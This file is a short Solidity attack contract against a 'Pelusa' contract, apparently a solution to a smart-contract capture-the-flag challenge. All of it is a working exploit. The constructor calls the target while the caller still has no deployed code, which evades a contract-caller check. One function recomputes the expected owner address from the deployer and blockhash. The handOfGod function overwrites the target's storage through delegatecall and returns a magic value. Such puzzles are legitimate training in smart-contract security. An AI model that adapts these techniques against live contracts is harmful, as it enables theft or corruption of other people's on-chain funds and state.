// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../src/Pelusa.sol";

contract AttackContract {
    address internal player;
    uint256 public goals = 1;

    Pelusa public pelusa;
    address public deployer;
    
    constructor(Pelusa _pelusa, address _deployer) {
        pelusa = _pelusa;
        deployer = _deployer;
        pelusa.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(deployer, blockhash(block.number))))));
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}